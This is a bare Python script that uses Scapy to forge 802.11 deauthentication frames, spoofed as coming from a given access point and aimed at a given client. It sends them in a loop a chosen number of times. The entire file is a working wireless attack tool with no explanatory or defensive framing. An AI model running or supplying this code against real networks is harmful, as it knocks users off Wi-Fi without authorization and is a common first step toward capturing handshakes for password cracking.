import sys
from scapy.all import *
import time

conf.iface = sys.argv[1]
conf.verb = 0
ap_mac = sys.argv[2]
client_mac = sys.argv[3]
count = sys.argv[4]
delay = 1

packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)

for n in range(int(count)):
	sendp(packet)
	print("Sending deauth packets: ", ap_mac, ' - ', client_mac)
	# time.sleep(delay)

